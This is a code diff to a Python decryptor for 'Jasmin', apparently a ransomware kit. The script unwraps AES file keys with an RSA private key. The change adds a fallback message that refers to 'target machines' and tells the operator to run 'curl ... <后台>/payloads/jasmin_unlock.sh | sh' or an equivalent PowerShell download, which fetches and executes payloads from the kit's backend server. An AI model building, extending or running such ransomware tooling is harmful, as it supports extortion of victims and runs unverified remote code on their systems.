@@ -4,10 +4,21 @@ Jasmin Linux Decryptor — RSA私钥解密AES密钥，SHA256完整性校验
 用法: python3 jasmin_decrypt.py <private_key.pem> [目录...]
 """
 import os, sys, struct, hashlib
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.backends import default_backend
+try:
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.backends import default_backend
+except ImportError:
+    # 很多目标机装不上 cryptography（无网络 / PEP 668 / 无预编译 wheel）。
+    # 主链路一律走零依赖的 openssl / PowerShell 脚本，本文件仅作可选工具保留。
+    sys.stderr.write(
+        '[!] 缺少 cryptography 库，本工具无法运行。\n'
+        '[!] 无需安装任何依赖，请改用零依赖解密器：\n'
+        '[!]   Linux/macOS: curl -sL <后台>/payloads/jasmin_unlock.sh | sh -s <后台> "<K口令>" <目录>\n'
+        '[!]   Windows    : curl.exe -sL <后台>/payloads/jasmin_unlock.ps1 -o u.ps1; '
+        'pwsh -File u.ps1 -Server <后台> -K "<K口令>" -Paths <目录>\n')
+    sys.exit(1)
 
 def unpad(data: bytes) -> bytes:
     if len(data) == 0:
